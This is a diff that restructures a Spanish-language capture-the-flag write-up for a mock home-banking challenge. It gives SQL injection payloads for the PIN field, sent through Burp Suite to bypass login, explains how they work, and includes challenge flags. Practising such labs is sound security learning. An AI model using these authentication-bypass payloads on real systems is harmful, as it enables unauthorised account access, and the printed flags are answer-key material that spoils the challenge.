@@ -1,28 +1,38 @@
 # Desafío 3 - Home Banking
 
-Y ahí podemos ver que tenemos la flag para pegar en la página 
-141e9ea9d1c4ade203ffe3ee03ebff1c 
- 
-Desafío 3 - Home Banking 
-Primero le pasé el problema a chat y me volvió loco mirando el inspeccionar y probando mil 
-cosas. Nunca se le ocurrió hacer una sql injection hasta que le tuve que decir (hay que 
-practicar eso porque en el evento no te dice la categoría) 
- 
-Ingrese ‘aa’ por ejemplo pero despues modifico esa línea por la siguiente 
-txtPin=' OR (SELECT 1 FROM usuarios LIMIT 1) -- &btnIngresar=Ingresar 
+## Análisis
+
+El campo de PIN es vulnerable a SQL Injection. Al cerrar la comilla simple se puede inyectar una condición que siempre sea verdadera, saltando la autenticación.
+
+## Explotación
+
+Se ingresa cualquier valor en el campo PIN (ej. `aa`), se intercepta la petición con Burp Suite y se modifica la línea del PIN por alguno de los siguientes payloads:
+
+```
+txtPin=' OR (SELECT 1 FROM usuarios LIMIT 1) -- &btnIngresar=Ingresar
+```
+
+```
 txtPin=' OR (1=1) -- &btnIngresar=Ingresar
+```
+
+**Explicación:**
+- La comilla simple `'` cierra la comilla que abre la base de datos.
+- `OR (1=1)` agrega una condición que siempre se cumple.
+- `--` comenta el resto de la consulta, anulando cualquier validación adicional.
 
 ![Desafío 3 - Home Banking - imagen 1](images/01.png)
 
 ![Desafío 3 - Home Banking - imagen 2](images/02.png)
-
-Osea basicamente al poner la comilla simple cierro la que abre la bd, luego pongo una 
-condición que siempre se cumpla y al comentar anuló toda la otra parte de la consulta 
- 
-bf58371373e52613ae270d5acf832bad
 
 ![Desafío 3 - Home Banking - imagen 3](images/03.png)
 
 ![Desafío 3 - Home Banking - imagen 4](images/04.png)
 
 ![Desafío 3 - Home Banking - imagen 5](images/05.png)
+
+## Flag
+
+```
+bf58371373e52613ae270d5acf832bad
+```
